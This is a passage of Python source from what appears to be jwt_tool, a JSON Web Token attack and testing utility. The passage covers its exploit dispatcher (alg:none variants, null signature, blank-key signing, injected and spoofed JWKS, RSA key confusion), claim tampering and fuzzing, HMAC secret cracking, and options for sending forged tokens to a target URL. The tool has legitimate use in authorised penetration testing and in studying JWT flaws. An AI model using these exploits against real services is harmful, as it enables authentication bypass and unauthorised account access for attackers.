    jwtOut(jwtTweak, "Prescan: Broken signature", "This token was sent to check if the signature is being checked")
    jwtOut(jwt, "Prescan: repeat original token", "Prescan: repeat original token")
    if origResCode != config['argvals']['rescode']:
        cprintc("Original token not working after invalid submission. Testing will need to be done manually, re-authenticating after each invalid submission", "red")
        exit(1)


def runScanning():
    cprintc("Running Scanning Module:", "cyan")
    preScan()
    if config['argvals']['scanMode'] == "pb":
        scanModePlaybook()
    if config['argvals']['scanMode'] == "er":
        scanModeErrors()
    if config['argvals']['scanMode'] == "cc":
        scanModeCommonClaims()
    if config['argvals']['scanMode'] == "at":
        scanModePlaybook()
        scanModeErrors()
        scanModeCommonClaims()


def runExploits():
    if args.exploit:
        if args.exploit == "a":
            noneToks = checkAlgNone(headDict, paylB64)
            zippedToks = dict(zip(noneToks, ["\"alg\":\"none\"", "\"alg\":\"None\"", "\"alg\":\"NONE\"", "\"alg\":\"nOnE\""]))
            for noneTok in zippedToks:
                desc = "EXPLOIT: "+zippedToks[noneTok]+" - this is an exploit targeting the debug feature that allows a token to have no signature\n(This will only be valid on unpatched implementations of JWT.)"
                jwtOut(noneTok, "Exploit: "+zippedToks[noneTok], desc)
        elif args.exploit == "n":
            jwtNull = checkNullSig(contents)
            desc = "EXPLOIT: null signature\n(This will only be valid on unpatched implementations of JWT.)"
            jwtOut(jwtNull, "Exploit: Null signature", desc)
        elif args.exploit == "b":
            key = ""
            newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
            jwtBlankPw = newContents+"."+newSig
            desc = "EXPLOIT: Blank password accepted in signature\n(This will only be valid on unpatched implementations of JWT.)"
            jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature", desc)
        elif args.exploit == "i":
            newSig, newContents = jwksEmbed(headDict, paylDict)
            desc = "EXPLOIT: injected JWKS\n(This will only be valid on unpatched implementations of JWT.)"
            jwtOut(newContents+"."+newSig, "Injected JWKS", desc)
        elif args.exploit == "s":
            if config['services']['jwksloc']:
                jku = config['services']['jwksloc']
            else:
                jku = config['services']['jwksdynamic']
            newContents, newSig = exportJWKS(jku)
            if config['services']['jwksloc'] and config['services']['jwksloc'] == args.jwksurl:
                cprintc("Paste this JWKS into a file at the following location before submitting token request: "+jku+"\n(JWKS file used: "+config['crypto']['jwks']+")\n"+str(config['crypto']['jwks'])+"", "cyan")
            desc = "Signed with JWKS at "+jku
            jwtOut(newContents+"."+newSig, "Spoof JWKS", desc)
        elif args.exploit == "k":
            if config['crypto']['pubkey']:
                newTok, newSig = checkPubKeyExploit(headDict, paylB64, config['crypto']['pubkey'])
                desc = "EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)\n(This will only be valid on unpatched implementations of JWT.)"
                jwtOut(newTok+"."+newSig, "RSA Key Confusion Exploit", desc)
            else:
                cprintc("No Public Key provided (-pk)\n", "red")
                parser.print_usage()

def runActions():
    if args.tamper:
        tamperToken(paylDict, headDict, sig)
        exit(1)
    if args.verify:
        if args.pubkey:
            algType = headDict["alg"][0:2]
            if algType == "RS":
                if args.pubkey:
                    verifyTokenRSA(headDict, paylDict, sig, args.pubkey)
                else:
                    verifyTokenRSA(headDict, paylDict, sig, config['crypto']['pubkey'])
                exit(1)
            elif algType == "ES":
                if config['crypto']['pubkey']:
                    verifyTokenEC(headDict, paylDict, sig, config['crypto']['pubkey'])
                else:
                    cprintc("No Public Key provided (-pk)\n", "red")
                    parser.print_usage()
                exit(1)
            elif algType == "PS":
                if config['crypto']['pubkey']:
                    verifyTokenPSS(headDict, paylDict, sig, config['crypto']['pubkey'])
                else:
                    cprintc("No Public Key provided (-pk)\n", "red")
                    parser.print_usage()
                exit(1)
            else:
                cprintc("Algorithm not supported for verification", "red")
                exit(1)
        elif args.jwksfile:
            parseJWKS(config['crypto']['jwks'])
        else:
            cprintc("No Public Key or JWKS file provided (-pk/-jw)\n", "red")
            parser.print_usage()
        exit(1)
    runExploits()
    if args.crack:
        if args.password:
            cprintc("Password provided, checking if valid...", "cyan")
            checkSig(sig, contents, config['argvals']['key'])
        elif args.dict:
            crackSig(sig, contents)
        elif args.keyfile:
            checkSigKid(sig, contents)
        else:
            cprintc("No cracking option supplied:\nPlease specify a password/dictionary/Public Key\n", "red")
            parser.print_usage()
        exit(1)
    if args.query and config['argvals']['sigType'] != "":
        signingToken(headDict, paylDict)

def printLogo():
    print()
    print("   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\                  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ ")
    print("   \__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m | \x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __| \__\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __|                 \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print("      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m | \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print("      \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  __\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\ \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print("\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  _\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print("\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  / \\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |  \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print("\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  /   \\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |   \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |       \x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\\\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m  |\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m |")
    print(" \______/ \__/     \__|   \__|\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\x1b[48;5;24m \x1b[0m\\__| \______/  \______/ \__|")
    print(" \x1b[36mVersion "+jwttoolvers+"          \x1b[0m      \______|             \x1b[36m@ticarpi\x1b[0m      ")
    print()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(epilog="If you don't have a token, try this one:\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("jwt", nargs='?', type=str,
                        help="the JWT to tinker with (no need to specify if in header/cookies)")
    parser.add_argument("-b", "--bare", action="store_true",
                        help="return TOKENS ONLY")
    parser.add_argument("-t", "--targeturl", action="store",
                        help="URL to send HTTP request to with new JWT")
    parser.add_argument("-rc", "--cookies", action="store",
                        help="request cookies to send with the forged HTTP request")
    parser.add_argument("-rh", "--headers", action="append",
                        help="request headers to send with the forged HTTP request (can be used multiple times for additional headers)")
    parser.add_argument("-pd", "--postdata", action="store",
                        help="text string that contains all the data to be sent in a POST request")
    parser.add_argument("-cv", "--canaryvalue", action="store",
                        help="text string that appears in response for valid token (e.g. \"Welcome, ticarpi\")")
    parser.add_argument("-np", "--noproxy", action="store_true",
                        help="disable proxy for current request (change in jwtconf.ini if permanent)")
    parser.add_argument("-nr", "--noredir", action="store_true",
                        help="disable redirects for current request (change in jwtconf.ini if permanent)")
    parser.add_argument("-M", "--mode", action="store",
                        help="Scanning mode:\npb = playbook audit\ner = fuzz existing claims to force errors\ncc = fuzz common claims\nat - All Tests!")
    parser.add_argument("-X", "--exploit", action="store",
                        help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
    parser.add_argument("-ju", "--jwksurl", action="store",
                        help="URL location where you can host a spoofed JWKS")
    parser.add_argument("-S", "--sign", action="store",
                        help="sign the resulting token:\nhs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)\nrs256/rs384/hs512 = RSA signing (specify an RSA private key with -pr)\nes256/es384/es512 = Elliptic Curve signing (specify an EC private key with -pr)\nps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)")
    parser.add_argument("-pr", "--privkey", action="store",
                        help="Private Key for Asymmetric crypto")
    parser.add_argument("-T", "--tamper", action="store_true",
                        help="tamper with the JWT contents\n(set signing options with -S or use exploits with -X)")
    parser.add_argument("-I", "--injectclaims", action="store_true",
                        help="inject new claims and update existing claims with new values\n(set signing options with -S or use exploits with -X)\n(set target claim with -hc/-pc and injection values/lists with -hv/-pv")
    parser.add_argument("-hc", "--headerclaim", action="append",
                        help="Header claim to tamper with")
    parser.add_argument("-pc", "--payloadclaim", action="append",
                        help="Payload claim to tamper with")
    parser.add_argument("-hv", "--headervalue", action="append",
                        help="Value (or file containing values) to inject into tampered header claim")
    parser.add_argument("-pv", "--payloadvalue", action="append",
                        help="Value (or file containing values) to inject into tampered payload claim")
    parser.add_argument("-C", "--crack", action="store_true",
                        help="crack key for an HMAC-SHA token\n(specify -d/-p/-kf)")
    parser.add_argument("-d", "--dict", action="store",
                        help="dictionary file for cracking")
    parser.add_argument("-p", "--password", action="store",
                        help="password for cracking")
    parser.add_argument("-kf", "--keyfile", action="store",
                        help="keyfile for cracking (when signed with 'kid' attacks)")
    parser.add_argument("-V", "--verify", action="store_true",
                        help="verify the RSA signature against a Public Key\n(specify -pk/-jw)")
    parser.add_argument("-pk", "--pubkey", action="store",
                        help="Public Key for Asymmetric crypto")
    parser.add_argument("-jw", "--jwksfile", action="store",
                        help="JSON Web Key Store for Asymmetric crypto")
    parser.add_argument("-Q", "--query", action="store",
                        help="Query a token ID against the logfile to see the details of that request\ne.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="When parsing and printing, produce (slightly more) verbose output.")
    args = parser.parse_args()
    if not args.bare:
        printLogo()
    try:
        path = os.path.expanduser("~/.jwt_tool")
        if not os.path.exists(path):
            os.makedirs(path)
    except:
        path = sys.path[0]
    logFilename = path+"/logs.txt"
    configFileName = path+"/jwtconf.ini"
    config = configparser.ConfigParser()
    if (os.path.isfile(configFileName)):
        config.read(configFileName)
    else:
        cprintc("No config file yet created.\nRunning config setup.", "cyan")
        createConfig()
    if config['services']['jwt_tool_version'] != jwttoolvers:
        cprintc("Config file showing wrong version ("+config['services']['jwt_tool_version']+" vs "+jwttoolvers+")", "red")
        cprintc("Current config file has been backed up as '"+path+"/old_("+config['services']['jwt_tool_version']+")_jwtconf.ini' and a new config generated.\nPlease review and manually transfer any custom options you have set.", "red")
        os.rename(configFileName, path+"/old_("+config['services']['jwt_tool_version']+")_jwtconf.ini")
        createConfig()
        exit(1)
    with open(path+"/null.txt", 'w') as nullfile:
        pass
    findJWT = ""
    if args.targeturl:
        if args.cookies or args.headers or args.postdata:
            jwt_count = 0
            jwt_locations = []

            if args.cookies and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', args.cookies):
                jwt_count += 1
                jwt_locations.append("cookie")

            if args.headers and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.headers)):
                jwt_count += 1
                jwt_locations.append("headers")

            if args.postdata and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.postdata)):
                jwt_count += 1
                jwt_locations.append("post data")

            if jwt_count > 1:
                cprintc("Too many tokens! JWT in more than one place: cookie, header, POST data", "red")
                exit(1)

            if args.cookies:
                try:
                    if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', args.cookies):
                        config['argvals']['headerloc'] = "cookies"
                except:
                    cprintc("Invalid cookie formatting", "red")
                    exit(1)

            if args.headers:
                try:
                    if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.headers)):
                        config['argvals']['headerloc'] = "headers"
                except:
                    cprintc("Invalid header formatting", "red")
                    exit(1)

            if args.postdata:
                try:
                    if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.postdata)):
                        config['argvals']['headerloc'] = "postdata"
                except:
                    cprintc("Invalid postdata formatting", "red")
                    exit(1)

            searchString = " | ".join([
                str(args.cookies),
                str(args.headers),
                str(args.postdata)
            ])

            try:
                findJWT = re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', searchString)[0]
            except:
                cprintc("Cannot find a valid JWT", "red")
                cprintc(searchString, "cyan")
                exit(1)
    if args.query:
        jwt = searchLog(args.query)
    elif args.jwt:
        jwt = args.jwt
        cprintc("Original JWT: "+findJWT+"\n", "cyan")
    elif findJWT:
        jwt = findJWT
        cprintc("Original JWT: "+findJWT+"\n", "cyan")
    else:
        parser.print_usage()
        cprintc("No JWT provided", "red")
        exit(1)
    if args.mode:
        if args.mode not in ['pb','er', 'cc', 'at']:
            parser.print_usage()
            cprintc("\nPlease choose a scanning mode (e.g. -M pb):\npb = playbook\ner = force errors\ncc = fuzz common claims\nat = all tests", "red")
            exit(1)
        else:
            config['argvals']['scanMode'] = args.mode
    if args.exploit:
        if args.exploit not in ['a', 'n', 'b', 's', 'i', 'k']:
            parser.print_usage()
            cprintc("\nPlease choose an exploit (e.g. -X a):\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS", "red")
            exit(1)
        else:
            config['argvals']['exploitType'] = args.exploit
    if args.sign:
        if args.sign not in ['hs256','hs384','hs512','rs256','rs384','rs512','es256','es384','es512','ps256','ps384','ps512']:
            parser.print_usage()
            cprintc("\nPlease choose a signature option (e.g. -S hs256)", "red")
            exit(1)
        else:
            config['argvals']['sigType'] = args.sign
    headDict, paylDict, sig, contents = validateToken(jwt)
    paylB64 = base64.urlsafe_b64encode(json.dumps(paylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    config['argvals']['overridesub'] = "false"
    if args.targeturl:
        config['argvals']['targetUrl'] = args.targeturl.replace('%','%%')
    if args.cookies:
        config['argvals']['cookies'] = args.cookies
    if args.headers:
        config['argvals']['header'] = str(args.headers)
    if args.dict:
        config['argvals']['keyList'] = args.dict
    if args.keyfile:
        config['argvals']['keyFile'] = args.keyfile
    if args.password:
        config['argvals']['key'] = args.password
    if args.pubkey:
        config['crypto']['pubkey'] = args.pubkey
    if args.privkey:
        config['crypto']['privkey'] = args.privkey
    if args.jwksfile:
        config['crypto']['jwks'] = args.jwksfile
    if args.jwksurl:
        config['services']['jwksloc'] = args.jwksurl
    if args.payloadclaim:
        config['argvals']['payloadclaim'] = str(args.payloadclaim)
    if args.headerclaim:
        config['argvals']['headerclaim'] = str(args.headerclaim)
    if args.payloadvalue:
        config['argvals']['payloadvalue'] = str(args.payloadvalue)
    if args.headervalue:
        config['argvals']['headervalue'] = str(args.headervalue)
    if args.postdata:
        config['argvals']['postData'] = args.postdata
    if args.canaryvalue:
        config['argvals']['canaryvalue'] = args.canaryvalue
    if args.noproxy:
        config['services']['proxy'] = "False"
    if args.noredir:
        config['services']['redir'] = "False"

    if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.injectclaims:
        rejigToken(headDict, paylDict, sig)
        if args.sign:
            signingToken(headDict, paylDict)
    if args.injectclaims:
        injectionfile = ""
        newheadDict = headDict
        newpaylDict = paylDict
        if args.headerclaim:
            if not args.headervalue:
                cprintc("Must specify header values to match header claims to inject.", "red")
                exit(1)
            if len(args.headerclaim) != len(args.headervalue):
                cprintc("Amount of header values must match header claims to inject.", "red")
                exit(1)
        if args.payloadclaim:
            if not args.payloadvalue:
                cprintc("Must specify payload values to match payload claims to inject.", "red")
                exit(1)
            if len(args.payloadclaim) != len(args.payloadvalue):
                cprintc("Amount of payload values must match payload claims to inject.", "red")
                exit(1)
        if args.payloadclaim:
            for payloadclaim, payloadvalue in zip(args.payloadclaim, args.payloadvalue):
                if os.path.isfile(payloadvalue):
                    injectionfile = ["payload", payloadclaim, payloadvalue]
                else:
                    newpaylDict, newPaylB64 = injectpayloadclaim(payloadclaim, payloadvalue)
                    paylB64 = newPaylB64
            newContents = genContents(headDict, newpaylDict)
            headDict, paylDict, sig, contents = validateToken(newContents+"."+sig)
        if args.headerclaim:
            for headerclaim, headervalue in zip(args.headerclaim, args.headervalue):
                if os.path.isfile(headervalue):
                    injectionfile = ["header", headerclaim, headervalue]
                else:
                    newheadDict, newHeadB64 = injectheaderclaim(headerclaim, headervalue)
                    newContents = genContents(newheadDict, paylDict)
                    headDict, paylDict, sig, contents = validateToken(newContents+"."+sig)
        if injectionfile:
            if args.mode:
                cprintc("Fuzzing cannot be used alongside scanning modes", "red")
                exit(1)
            cprintc("Fuzzing file loaded: "+injectionfile[2], "cyan")
            with open(injectionfile[2], "r", encoding='utf-8', errors='ignore') as valLst:
                nextVal = valLst.readline()
                cprintc("Generating tokens from injection file...", "cyan")
                utf8errors = 0
                wordcount = 0
                while nextVal:
                    if injectionfile[0] == "payload":
                        newpaylDict, newPaylB64 = injectpayloadclaim(injectionfile[1], nextVal.rstrip())
                        newContents = genContents(headDict, newpaylDict)
                        headDict, paylDict, sig, contents = validateToken(newContents+"."+sig)
                        paylB64 = newPaylB64
                    elif injectionfile[0] == "header":
                        newheadDict, newHeadB64 = injectheaderclaim(injectionfile[1], nextVal.rstrip())
                        newContents = genContents(newheadDict, paylDict)
                        headDict, paylDict, sig, contents = validateToken(newContents+"."+sig)
                    injectOut(newheadDict, newpaylDict)
                    nextVal = valLst.readline()
            exit(1)
        else:
            if not args.mode:
                injectOut(newheadDict, newpaylDict)
                exit(1)
    if args.mode:
        if not config['argvals']['targeturl'] and not args.bare:
            cprintc("No target secified (-t), cannot scan offline.", "red")
            exit(1)
        runScanning()
    runActions()
    exit(1)
